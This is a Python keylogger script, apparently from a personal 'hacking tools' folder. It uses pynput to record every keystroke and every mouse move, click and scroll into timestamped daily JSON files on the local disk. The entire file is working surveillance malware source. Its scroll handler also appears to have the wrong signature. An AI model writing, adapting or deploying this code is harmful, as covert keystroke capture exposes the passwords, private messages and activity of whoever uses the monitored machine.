from genericpath import isfile
from pynput import keyboard, mouse
from datetime import datetime
from datetime import date
from getpass import getuser
import os
import json

folder = os.path.join("C:\\Users", getuser(), "key_logs")
folder = r"E:\coding\Hacking\tools\src\resources"

os.makedirs(folder, exist_ok=True)

def write(event_type, details):
    timestamp  = datetime.now().strftime("%Y-%m-%d (%H:%M:%S)")
    LOG_FILE  = fr"{folder}\{date.today()}_keyLog.json"
    
    keylog = {}
    
    if os.path.isfile(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            keylog = json.load(f)

    keylog.setdefault(timestamp, [])
    keylog[timestamp].append({
        "type": event_type,
        "details": details
    })

    with open(LOG_FILE, "w") as f:
        json.dump(keylog, f, indent=2)

def onPress(key):
    try:
        write("Write", key.char)
    except AttributeError:
        write("Write", str(key))

def onMove(x, y):
    write("MouseMove", f"Position: {x, y}")

def onClick(x, y, button, pressed):
    action = "Pressed" if pressed else "Released"
    write("MouseClick", f"{button} {action} at {x, y}")

def onScroll(x, y, dy):
    write("MouseScroll", f"Scrolled {'down' if dy < 0 else 'up'} at {x, y}")

keyboard_listener = keyboard.Listener(on_press=onPress)
mouse_listener = mouse.Listener(on_move=onMove, on_click=onClick, on_scroll=onScroll)

keyboard_listener.start()
mouse_listener.start()

keyboard_listener.join()
mouse_listener.join()

